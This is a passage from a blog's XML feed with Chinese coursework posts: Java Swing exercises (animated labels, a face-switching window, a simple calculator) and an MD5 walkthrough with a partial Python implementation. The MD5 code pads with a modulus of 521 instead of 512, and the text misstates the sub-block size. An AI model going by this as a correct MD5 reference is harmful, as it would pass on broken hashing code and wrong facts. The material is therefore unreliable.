class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">                                lb1.setLocation(lb1.getX()+<span class="number">10</span>, lb1.getY());</span><br><span class="line">                                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">                        <span class="keyword">try</span>&#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++) &#123;</span><br><span class="line">                                lb2.setLocation(lb2.getX() - <span class="number">10</span>, lb2.getY());</span><br><span class="line">                                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Move();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/ggBmZmg.png" alt=""></p><h1 id="GUI-变脸"><a href="#GUI-变脸" class="headerlink" title="GUI-变脸"></a>GUI-变脸</h1><p>编写一个“变脸”程序：将实验六第5题中的两个脸合到一个程序中，利用事件处理程序mouseUp()实现程序运行后出现一张笑脸，鼠标点击一次则变成哭脸，再点击一次又变成笑脸，依次轮换。</p><p>paint方法是自动调用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FaceChange</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> b=<span class="keyword">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FaceChange</span><span class="params">()</span></span>&#123;</span><br><span class="line">        setTitle(<span class="string">"变脸怪"</span>);</span><br><span class="line">        setBounds(<span class="number">300</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">300</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">        <span class="keyword">this</span>.addMouseListener(<span class="keyword">new</span> MouseAdapter()  &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseClicked</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">1</span>) &#123;b=<span class="keyword">false</span>; repaint();&#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;b=<span class="keyword">true</span>; repaint();&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.paint(g);</span><br><span class="line">        <span class="keyword">if</span>(b) &#123;</span><br><span class="line">            g.setColor(Color.blue);</span><br><span class="line">            g.drawOval(<span class="number">150</span>, <span class="number">50</span>, <span class="number">150</span>, <span class="number">200</span>);</span><br><span class="line">            g.drawArc(<span class="number">180</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">250</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">200</span>, <span class="number">200</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">            g.drawString(<span class="string">"笑"</span>, <span class="number">50</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            g.setColor(Color.blue);</span><br><span class="line">            g.drawOval(<span class="number">150</span>, <span class="number">50</span>, <span class="number">150</span>, <span class="number">200</span>);</span><br><span class="line">            g.drawArc(<span class="number">180</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">250</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">200</span>, <span class="number">200</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">            g.drawString(<span class="string">"哭"</span>, <span class="number">50</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">new</span> FaceChange();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/7I5PZNx.png" alt=""><br><img src="https://i.imgur.com/mrIygEp.png" alt=""></p><h1 id="GUI-计算器"><a href="#GUI-计算器" class="headerlink" title="GUI-计算器"></a>GUI-计算器</h1><p>实现了监听类<br><img src="https://i.imgur.com/29KIyPK.png" alt=""><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calculator</span> <span class="keyword">extends</span> <span class="title">JFrame</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WIDTH = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEIGHT =<span class="number">200</span>;</span><br><span class="line">    JButton[] buttons = <span class="keyword">new</span> JButton[<span class="number">4</span>];</span><br><span class="line">    TextField tf1,tf2,tf3;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calculator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        setTitle(<span class="string">"计算器"</span>);</span><br><span class="line">        setLayout(<span class="keyword">new</span> GridLayout(<span class="number">4</span>, <span class="number">1</span>));</span><br><span class="line">        String[] caculate = &#123;<span class="string">"+"</span>, <span class="string">"-"</span>, <span class="string">"*"</span>, <span class="string">"/"</span>&#125;;</span><br><span class="line">        JPanel panel = <span class="keyword">new</span> JPanel();</span><br><span class="line">        panel.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">1</span>,<span class="number">4</span>));</span><br><span class="line">        MyListener ml=<span class="keyword">new</span> MyListener();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            buttons[i] = <span class="keyword">new</span> JButton(caculate[i]);</span><br><span class="line">            buttons[i].addActionListener(ml);</span><br><span class="line">            panel.add(buttons[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        tf1 = <span class="keyword">new</span> TextField();</span><br><span class="line">        tf2 = <span class="keyword">new</span> TextField();</span><br><span class="line">        tf3 = <span class="keyword">new</span> TextField();</span><br><span class="line">        add(tf1);</span><br><span class="line">        add(tf2);</span><br><span class="line">        add(panel);</span><br><span class="line">        add(tf3);</span><br><span class="line">        setSize(WIDTH, HEIGHT);</span><br><span class="line">        setLocation(<span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">double</span> a,b,result;</span><br><span class="line">            String bname=e.getActionCommand();</span><br><span class="line">            a=Double.parseDouble(tf1.getText());</span><br><span class="line">            b=Double.parseDouble(tf2.getText());</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"+"</span>))&#123;</span><br><span class="line">                result=a+b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"-"</span>))&#123;</span><br><span class="line">                result=a-b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"*"</span>))&#123;</span><br><span class="line">                result=a*b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"/"</span>))&#123;</span><br><span class="line">                result=a/b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Calculator();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;类编程&quot;&gt;&lt;a href=&quot;#类编程&quot; class=&quot;headerlink&quot; title=&quot;类编程&quot;&gt;&lt;/a&gt;类编程&lt;/h1&gt;&lt;p&gt;类Person:&lt;br&gt;          属性：编号、姓名、性别；&lt;br&gt;          构造方法：确定编号和姓名；&lt;br&gt; 
      
    
    </summary>
    
      <category term="java" scheme="http://yoursite.com/categories/java/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>MD5实现</title>
    <link href="http://yoursite.com/2018/12/27/MD5/"/>
    <id>http://yoursite.com/2018/12/27/MD5/</id>
    <published>2018-12-26T16:00:00.000Z</published>
    <updated>2018-12-28T08:01:39.871Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hash函数实现"><a href="#hash函数实现" class="headerlink" title="hash函数实现"></a>hash函数实现</h1><ol><li>update() 函数把字典参数 dict2 的 key/value(键/值) 对更新到字典 dict 里。</li><li><p>hash.update(arg)<br>该方法只接受byte类型，否则会报错.<br>重复调用update(arg)方法，是会将传入的arg参数进行拼接，而不是覆盖</p></li><li><p>hash.new(name[,data])<br>name传入哈希机密算法名称(md5)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genearteMD5</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="comment"># 创建md5对象</span></span><br><span class="line">    hl = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Tips</span></span><br><span class="line">    <span class="comment"># 此处必须声明encode</span></span><br><span class="line">    <span class="comment"># 否则报错为：hl.update(str)    Unicode-objects must be encoded before hashing</span></span><br><span class="line">    hl.update(str.encode(encoding=<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'MD5加密前为 ：'</span> + str)</span><br><span class="line">    print(<span class="string">'MD5加密后为 ：'</span> + hl.hexdigest())</span><br></pre></td></tr></table></figure></li></ol><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p>1) Little-Endian就是低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。<br>2) Big-Endian就是高位字节排放在内存的低地址端，低位字节排放在内存的高地址端。</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>md5的输入为512位的倍数，输出为128位。</p><h2 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h2><p>填充的方法是填充一个1和n个0，信息的长度就为N*512+448(bit),将原始消息长度用64位附加在填充结果后，消息长度为512比特整数倍。</p><h2 id="初始化链接变量（小端模式）"><a href="#初始化链接变量（小端模式）" class="headerlink" title="初始化链接变量（小端模式）"></a>初始化链接变量（小端模式）</h2><p>（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L）</p><h2 id="四轮循环"><a href="#四轮循环" class="headerlink" title="四轮循环"></a>四轮循环</h2><p>将每一512bit细分成16个小组，每个小组64位（8个字节）(M0~M15)</p><h3 id="四个线性函数"><a href="#四个线性函数" class="headerlink" title="四个线性函数"></a>四个线性函数</h3><p>F(X,Y,Z)=(X&amp;Y)|((~X)&amp;Z)<br>G(X,Y,Z)=(X&amp;Z)|(Y&amp;(~Z))<br>H(X,Y,Z)=X^Y^Z<br>I(X,Y,Z)=Y^(X|(~Z))</p><p>设Mj表示消息的第j个子分组（从0到15），&lt;&lt;</p><p>FF(a,b,c,d,Mj,s,ti)表示a=b+((a+F(b,c,d)+Mj+ti)&lt;&lt;&lt;s)<br>GG(a,b,c,d,Mj,s,ti)表示a=b+((a+G(b,c,d)+Mj+ti)&lt;&lt;&lt;s)<br>HH(a,b,c,d,Mj,s,ti)表示a=b+((a+H(b,c,d)+Mj+ti)&lt;&lt;&lt;s)<br>II(a,b,c,d,Mj,s,ti)表示a=b+((a+I(b,c,d)+Mj+ti)&lt;&lt;&lt;s)</p><p>ti=[0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf,  0x4787c62a, 0xa8304613, 0xfd469501, 0x698098d8, 0x8b44f7af,  0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e,  0x49b40821, 0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,  0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8, 0x21e1cde6,  0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8,  0x676f02d9, 0x8d2a4c8a, 0xfffa3942, 0x8771f681, 0x6d9d6122,  0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,  0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039,  0xe6db99e5, 0x1fa27cf8, 0xc4ac5665, 0xf4292244, 0x432aff97,  0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d,  0x85845dd1, 0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,  0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391 ]</p><p>si=[7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 4, 11,16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10, 15,21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]</p><p>共四轮运算</p><h3 id="每轮循环"><a href="#每轮循环" class="headerlink" title="每轮循环"></a>每轮循环</h3><p>每轮循环后，将A，B，C，D分别加上a，b，c，d，然后进入下一循环。</p><p>贴一个图便于理解</p><p><img src="https://i.imgur.com/oyEyUAP.png" alt=""></p><h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p>a⊕b = (¬a ∧ b) ∨ (a ∧¬b)</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse32</span><span class="params">(bitString32)</span>:</span>    <span class="comment">#32位2进制大端转小端,返回32位2进制流</span></span><br><span class="line">    newString=<span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> len(bitString32)!=<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"需要32位"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>]:</span><br><span class="line">        newString+=bitString32[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">return</span> newString</span><br><span class="line"><span class="comment">#a=bin(int('0xabcdefef',16))[2:]</span></span><br><span class="line"><span class="comment">#print(rearrange(a))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reversehex</span><span class="params">(num)</span>:</span>       <span class="comment">#整数转化为8位16进制数，小端转大端输出</span></span><br><span class="line">    hexformat=format(num,<span class="string">'08x'</span>)</span><br><span class="line">    newString=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>]:</span><br><span class="line">        newString+=hexformat[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> newString</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(bitString)</span>:</span>    <span class="comment">#填充位为512bit整数倍,先补充1和0,为448bit,将原始消息长度以64bit填充后面，返回二进制流</span></span><br><span class="line">    startLength=len(bitString)</span><br><span class="line">    bitString+=<span class="string">'1'</span></span><br><span class="line">    <span class="keyword">while</span> len(bitString)%<span class="number">521</span>!=<span class="number">448</span>:</span><br><span class="line">        bitString+=<span class="string">'0'</span></span><br><span class="line">    lastPart = format(startLength, <span class="string">'064b'</span>)</span><br><span class="line">    bitString+=reverse32(lastPart[<span class="number">32</span>:])+reverse32(lastPart[<span class="number">0</span>:<span class="number">32</span>])</span><br><span class="line">    <span class="keyword">return</span> bitString</span><br><span class="line"><span class="comment">#print(fill('1000'))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getGroup</span><span class="params">(bitString)</span>:</span>    <span class="comment">#512bit为一个分组共N+1，将每一个分组消息分成16个子分组，每个子分组32bit，返回二进制流。</span></span><br><span class="line">    currPos=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> currPos&lt;len(bitString):</span><br><span class="line">        currPart=bitString[currPos:currPos+<span class="number">512</span>]</span><br><span class="line">        mySplits=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            mySplits.append(int(reverse32(currPart[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>]),<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">yield</span> mySplits</span><br><span class="line">        currPos+=<span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leftrot32</span><span class="params">(x,n)</span>:</span>      <span class="comment">#循环左移</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum32</span><span class="params">(a,b)</span>:</span>     <span class="comment">#四轮完成后进行加运算</span></span><br><span class="line">    <span class="keyword">return</span> (a+b)%(<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5encrypt</span><span class="params">(testString)</span>:</span> <span class="comment">#md5加密实现</span></span><br><span class="line">    text=<span class="string">''</span>              <span class="comment">#将每个字符固定为8位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> testString:</span><br><span class="line">        text+=format(ord(i),<span class="string">'08b'</span>)</span><br><span class="line">    text=fill(text)</span><br><span class="line"></span><br><span class="line">    t = [int(math.floor((<span class="number">2</span> ** <span class="number">32</span>) * abs(math.sin(i + <span class="number">1</span>)))) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">    s = [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>,</span><br><span class="line">         <span class="number">20</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>,</span><br><span class="line">         <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">    A0 = <span class="number">0x67452301</span></span><br><span class="line">    B0 = <span class="number">0xefcdab89</span></span><br><span class="line">    C0 = <span class="number">0x98badcfe</span></span><br><span class="line">    D0 = <span class="number">0x10325476</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> getGroup(text):    <span class="comment">#初始化寄存器</span></span><br><span class="line">        A = A0</span><br><span class="line">        B = B0</span><br><span class="line">        C = C0</span><br><span class="line">        D = D0</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):       <span class="comment">#执行4轮轮询共64步，每一轮16步。输入为4个32bit链接变量和32bit子分组，输出32bit</span></span><br><span class="line">            <span class="keyword">if</span> i &lt;= <span class="number">15</span>:</span><br><span class="line">                f = (B &amp; C) | ((~B) &amp; D)</span><br><span class="line">                g = i</span><br><span class="line">            <span class="keyword">elif</span> i &lt;= <span class="number">31</span>:</span><br><span class="line">                f = (B &amp; D) | ( C&amp; (~D))</span><br><span class="line">                g = (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">elif</span> i &lt;= <span class="number">47</span>:</span><br><span class="line">                f = B ^ C ^ D</span><br><span class="line">                g = (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f = C ^ (B | ~D)</span><br><span class="line">                g = (<span class="number">7</span> * i) % <span class="number">16</span></span><br><span class="line">            dtemp=D</span><br><span class="line">            D = C</span><br><span class="line">            C = B</span><br><span class="line">            B=sum32(B, leftrot32((A + f +m[g]+ t[i]) % (<span class="number">2</span> ** <span class="number">32</span>), s[i]))</span><br><span class="line">            A=dtemp</span><br><span class="line"></span><br><span class="line">        A0 = sum32(A, A0)            <span class="comment">#四轮完成后作加法模运算，ABCD值作为下一轮迭代压缩的链接变量</span></span><br><span class="line">        B0 = sum32(B, B0)</span><br><span class="line">        C0 = sum32(C, 